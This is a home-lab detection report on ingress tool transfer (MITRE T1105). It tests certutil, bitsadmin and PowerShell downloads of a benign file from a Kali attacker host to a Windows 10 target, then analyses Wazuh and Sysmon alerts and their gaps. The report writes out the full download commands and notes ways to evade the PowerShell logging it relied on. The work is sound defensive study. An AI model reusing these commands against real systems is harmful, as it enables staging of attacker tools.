# Attack Report: T1105 — Ingress Tool Transfer

**Date:** 2026-11-12 to 2026-11-13  
**ATT&CK ID:** T1105  
**Technique:** Ingress Tool Transfer  
**Tactic:** Command and Control  
**Tools:** certutil.exe (LOLBin), bitsadmin.exe (LOLBin),
PowerShell Invoke-WebRequest  
**Attacker:** Kali Linux — 192.168.2.40 (ATTACKNET segment),
HTTP server on port 8080  
**Target:** Windows 10 Evaluation — 192.168.1.30 (labnet segment)  
**Detection result:** PARTIAL — all three methods detected via
PowerShell Script Block Logging (rule 91816), but Sysmon-based
process and network indicators not yet surfaced as named
tool-specific alerts. No dedicated certutil or bitsadmin detection
rules present in default Wazuh ruleset.  
**Ground truth timestamp:** Logged via `gtruth`, see
scenario-001.csv  

---

## Technique Description

T1105 describes the act of transferring a file, tool, or payload onto
a compromised machine from an attacker-controlled source, as a named,
distinct step in an attack chain. While payload delivery was performed
implicitly in earlier Phase 3 attacks (Attack 4, T1003.001 used
Invoke-WebRequest to stage the Meterpreter executable), this report
formally tests ingress tool transfer as an isolated technique,
comparing three distinct transfer mechanisms side by side to assess
which are detected, how they are detected, and what detection gaps
exist.

T1105 is one of the highest-value early-chain techniques to detect
reliably in a SOC environment. It typically occurs before the most
damaging stages (credential theft, lateral movement, ransomware
deployment) and catching it reliably creates an opportunity to
intervene before significant damage occurs.

---

## Test File Preparation

A benign test payload was created on Kali and served via Python's
built-in HTTP server:

```bash
cd /tmp
echo "This is a benign test payload for T1105 ingress tool transfer testing" > test_tool.txt
python3 -m http.server 8080
```

Three separate downloads were then attempted on Windows 10 using
distinct transfer mechanisms. All commands were run from an
Administrator PowerShell session.

---

## Method A — Certutil.exe (LOLBin)

### What certutil is and why attackers use it

`certutil.exe` is a legitimate Windows certificate management tool,
part of Certificate Services and present by default on every Windows
machine. It has a documented side capability — the `-urlcache` flag
— originally intended for caching certificate revocation lists from
remote URLs. This flag can download any file from any URL, making
certutil one of the most widely-documented Living off the Land
Binaries (LOLBins): a trusted, pre-installed, Microsoft-signed tool
that an attacker can repurpose as a file downloader without installing
anything new.

### Execution

```powershell
certutil.exe -urlcache -split -f "http://192.168.2.40:8080/test_tool.txt" "$env:TEMP\certutil_download.txt"
```

```
****  Online  ****
  0000  ...
  005d
CertUtil: -URLCache command completed successfully.
```

Download succeeded. File written to `%TEMP%\certutil_download.txt`.

### Sysmon local evidence

**Event ID 1 (ProcessCreate):**
```
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil.exe -urlcache -split -f 
  http://192.168.2.40:8080/test_tool.txt
  C:\Users\ADMINI~1\AppData\Local\Temp\certutil_download.txt
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: HOMELAB\Administrator
Hashes: MD5=E6384AD54B07F9783135586C71F82D1C
        SHA256=FD1670B43E2D9...
        IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465
```

**Event ID 3 (NetworkConnect) — two connections:**
```
Image: C:\Windows\System32\certutil.exe
SourceIp: 192.168.1.30
DestinationIp: 192.168.2.40
DestinationPort: 8080
Protocol: tcp
```

Two connections are expected and normal HTTP behaviour: one for the
initial HEAD/OPTIONS request and one for the actual GET download.

---

## Method B — BITSAdmin Transfer (LOLBin — transfer failed)

### What BITS is and why attackers use it

BITS (Background Intelligent Transfer Service) is a Windows service
designed for resilient, throttled background transfers, most famously
used by Windows Update itself. `bitsadmin.exe` can queue arbitrary
download jobs via this service. BITS transfers are low-priority and
designed to blend into normal background Windows activity — a notably
stealthy transfer method in real attacks, since BITS activity can look
identical to legitimate OS update traffic.

### Execution attempt 1 — shorthand syntax

```powershell
bitsadmin.exe /transfer T1105test /download /priority normal "http://192.168.2.40:8080/test_tool.txt" "$env:TEMP\bitsadmin_download.txt"
```

```
Unable to add file - 0x800704dd
The operation being requested was not performed because the user
has not logged on to the network. The specified service does not exist.
```

### Execution attempt 2 — explicit create/addfile/resume syntax

```powershell
bitsadmin.exe /create T1105test2
bitsadmin.exe /addfile T1105test2 "http://192.168.2.40:8080/test_tool.txt" "$env:TEMP\bitsadmin_download2.txt"
```

```
Created job {FE1C6AA8-9185-42A9-AF5E-4E020718225B}.
Unable to add file to job - 0x800704dd
The operation being requested was not performed because the user has
not logged on to the network. The specified service does not exist.
```

### Root cause: session context limitation

Error code `0x800704dd` indicates BITS refused the file transfer
because it requires an interactive, network-authenticated user session
context. The Administrator PowerShell session in which commands were
run (originating from an RDP connection to Windows 10, itself part
of an adversarial chain) lacked the specific session type BITS
requires. This is a known, documented Windows behaviour: BITS is not
universally available across all session contexts and fails silently
in certain remote or service-originated sessions.

**Operational finding:** BITS is a less universally reliable transfer
method than commonly assumed in threat intelligence. Attackers who
depend on it as their primary staging mechanism may be unexpectedly
blocked by this same limitation, making it both stealthier when it
works and less reliable overall.

### Despite failure — detection still fired

Critically, PowerShell Script Block Logging captured the bitsadmin
command text in Wazuh even though the transfer never actually
occurred:

```json
"scriptBlockText": "bitsadmin.exe /transfer T1105test /download 
/priority normal \"http://192.168.2.40:8080/test_tool.txt\" 
\"$env:TEMP\\bitsadmin_download.txt\""
```

**Rule 91816 fired on the attempted bitsadmin transfer.** PowerShell
Script Block Logging captures intent, not just outcome — a command
typed at the PowerShell prompt is logged regardless of whether the
resulting process succeeds or fails. This means a defender can detect
a bitsadmin transfer attempt even when the transfer itself is
unsuccessful, closing a gap that file-creation or network-connection
based detection would leave open.

---

## Method C — PowerShell Invoke-WebRequest

### Execution

```powershell
Invoke-WebRequest -Uri "http://192.168.2.40:8080/test_tool.txt" -OutFile "$env:TEMP\powershell_download.txt"
```

No output (silent success). File written to
`%TEMP%\powershell_download.txt`.

### Sysmon local evidence

**Event ID 3 (NetworkConnect):**
```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
SourceIp: 192.168.1.30
DestinationIp: 192.168.2.40
DestinationPort: 8080
Protocol: tcp
User: HOMELAB\Administrator
```

---

## SIEM Detection Analysis

### Why Wazuh UI searches initially returned nothing

Initial searches on `data.win.eventdata.commandLine` returned zero
results for all three methods. This field is populated by **Sysmon
Event ID 1** (ProcessCreate). The actual detections arrived via
**PowerShell Event ID 4104** (Script Block Logging), which stores
command content under `data.win.eventdata.scriptBlockText` — a
completely different field path. This is a subtle but important
distinction for a SOC analyst: the tool that surfaced the detection
was not the one being searched, because the detection mechanism was
the PowerShell session wrapper, not the tool itself.

The correct search:
```
data.win.eventdata.scriptBlockText: *certutil*
```
Returns all three rule 91816 hits immediately.

### Detection table

| Timestamp (UTC) | Rule ID | Description | Level | Method | Detection Vector |
|---|---|---|---|---|---|
| 04:54:06.802 | 91816 | Powershell script querying system environment variables | 4 | B (bitsadmin attempt) | 4104 Script Block Logging |
| 04:54:17.676 | 91816 | Powershell script querying system environment variables | 4 | A (certutil) | 4104 Script Block Logging |
| 04:54:22.289 | 91816 | Powershell script querying system environment variables | 4 | C (Invoke-WebRequest) | 4104 Script Block Logging |

### Bonus finding — Kali agent detected its own listener change

Wazuh's Kali agent (agent ID 003) independently fired rule 533
("Listened ports status changed") when the Python HTTP server process
restarted between sessions:

```
rule 533 — Listened ports status (netstat) changed
Previous: python3 on port 8080 (PID 17639)
Current:  python3 on port 8080 (PID 9579)
```

This demonstrates bidirectional visibility: Wazuh was monitoring the
attacker's own machine via the kali-attacker agent and detected a
state change on the C2 infrastructure side of the transfer, entirely
independent of anything observed on the Windows 10 target. A real
SOC with this kind of visibility could correlate the port listener
change on the C2 host with the network connection events on the
target, producing a richer, cross-host incident timeline.

---

## Detection Verdict

**PARTIAL.** All three methods generated rule 91816 alerts via
PowerShell Script Block Logging. However this detection has two
meaningful limitations:

**Limitation 1 — Detection depends on the wrapper, not the tool.**
All three detections fired because the commands were typed at a
PowerShell prompt, capturing the command text via Event ID 4104.
An attacker who invokes certutil or bitsadmin directly (via cmd.exe,
a scheduled task, or by calling the binary directly from another
process) would not generate these 4104 events, and the current ruleset
has no dedicated rule matching certutil's or bitsadmin's specific
command-line patterns via Sysmon Event ID 1 (ProcessCreate).

**Limitation 2 — Rule 91816 is generic, not specific.** The alert
description "Powershell script querying system environment variables"
does not name certutil, bitsadmin, or ingress tool transfer by
technique. An analyst reading this alert in isolation would not
immediately recognise it as a T1105 indicator without further
investigation. The raw scriptBlockText containing the URL and
destination IP is present in the alert data but is not surfaced in
the alert's display text.

Both of these are Phase 4 targets: a Sigma rule matching certutil's
`-urlcache` flag in Sysmon Event ID 1 CommandLine data, and a Wazuh
rule matching bitsadmin's `/transfer` or `/addfile` flags similarly,
would close these gaps without requiring a PowerShell wrapper to be
present.

---

## Lessons Learned

**Living off the Land detection requires process-level telemetry, not
just network or file telemetry.** certutil's download succeeded cleanly
and left no dropped executable (the transferred file was text), making
file-creation and hash-based detection irrelevant. The only reliable
detection path for certutil abuse is Sysmon Event ID 1 matching the
`-urlcache` flag in the CommandLine field, or Event ID 3 matching
outbound connections specifically from certutil.exe — both of which
are present in the local Sysmon log but not yet matched by a named,
specific Wazuh rule.

**Script Block Logging detects intent, not just outcome.** The
bitsadmin transfer failed completely, yet the detection fired. This is
a genuinely useful property: in an environment where BITS failures are
common due to session context issues, Script Block Logging still
provides a signal that the transfer was attempted, even when no file
was created and no network connection was established.

**Dedicated LOLBin detection rules are a Phase 4 priority.** The
current default Wazuh ruleset treats certutil and bitsadmin as
processes whose network connections are worth logging (via Sysmon
NetworkConnect includes) but does not raise specific, named alerts
for their known-malicious usage patterns. Writing these rules, citing
specific ATT&CK technique IDs, would materially improve the
detection fidelity of this lab beyond its current state.

---

## SA Market Relevance

Living off the Land techniques, specifically certutil and BITS abuse,
appear consistently in post-breach analyses of South African
enterprise incidents. Tools that arrive pre-installed on Windows and
can download arbitrary payloads without touching a package manager or
triggering software installation events are specifically chosen by
threat actors to avoid detection controls that focus on new software
appearing on a system. The detection gap documented here — specifically
that certutil's successful file download generated no named, specific
alert in the default Wazuh ruleset — represents exactly the kind of
concrete, measurable gap that a SC-200-qualified analyst or Security
Engineer would be expected to identify and close.

---

## References

- MITRE ATT&CK T1105: attack.mitre.org/techniques/T1105/
- LOLBins/certutil: lolbas-project.github.io/lolbas/Binaries/Certutil/
- LOLBins/bitsadmin: lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
- BITS error 0x800704dd: Microsoft error code reference
- Sysmon NetworkConnect certutil inclusion: active Sysmon config,
  `/mnt/user-data/outputs/` sysmonconfig-with-lsass.xml
- Phase 4 target: Sigma rule for certutil -urlcache
  (detection/specs/T1105-certutil-urlcache.yml, to be created)
